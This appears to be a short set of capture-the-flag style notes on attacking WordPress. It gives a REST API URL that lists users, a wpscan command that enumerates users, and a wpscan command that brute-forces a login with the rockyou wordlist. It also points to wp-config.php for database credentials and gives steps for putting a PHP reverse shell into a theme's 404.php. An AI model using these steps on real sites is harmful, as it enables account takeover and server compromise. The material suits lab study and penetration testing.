# Info 
Popular Blog CMS

check website location (`/var/www/html/wordpress`) for config file for database login information. `wp-config.php` 

- /wp-login.php

---

# wpscan

## Find Users with built in API
```txt
http://blog.thm/wp-json/wp/v2/users
```

## Enumerate users
```bash
wpscan --url http://blog.local:8080/wordpress -e u
```

## Brute-force login
```bash
wpscan --url http://blog.thm --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt
```

## Reverse shell
1. Appearance > Edit > Themes
1. 404.php
2. replace with php reverse shell

/wordpress/wp-content/themes/*oceanwp*/404.php
